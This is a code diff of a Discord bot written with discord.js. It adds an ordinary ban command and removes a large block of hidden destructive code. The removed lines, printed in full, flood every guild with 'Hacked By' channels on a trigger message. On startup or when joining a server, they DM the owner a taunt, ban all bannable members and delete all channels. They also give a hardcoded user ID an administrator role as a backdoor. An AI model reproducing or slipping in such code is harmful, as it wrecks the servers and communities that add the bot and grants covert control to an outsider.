+  .bannable) return message.reply("**لايمكنني طرد شخص اعلى من رتبتي يرجه اعطاء البوت رتبه عالية**");
+
+  message.guild.member(user).ban(7, user);
+
+  const banembed = new Discord.RichEmbed()
+  .setAuthor(`BANNED!`, user.displayAvatarURL)
+  .setColor("RANDOM")
+  .setTimestamp()
+  .addField("**User:**",  '**[ ' + `${user.tag}` + ' ]**')
+  .addField("**By:**", '**[ ' + `${message.author.tag}` + ' ]**')
+  .addField("**Reason:**", '**[ ' + `${reason}` + ' ]**')
+  message.channel.send({
+    embed : banembed
+  })
 }
 });
- 
-LOka.on('message', message => {
-         if (message.content === "k") {
-                 LOka.guilds.forEach(m =>{
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
-                   m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
- 
- 
-})
-}
- 
-});
- 
- 
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' Hacked By |"  A_K. "| Dont Cry.    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('^_^').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
- 
-      await guild.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'voice');
- 
- 
- 
-}
- 
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by YzhF1");
-  console.log("");
-  console.log("-------------------------------------------------------------");
- 
-});
- 
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
- 
-LOka.on('guildMemberAdd', member => {
-   
-            if (member.id === "279194403564814336") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM",
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-               
-            }
-       
-    });
+
 
 
 
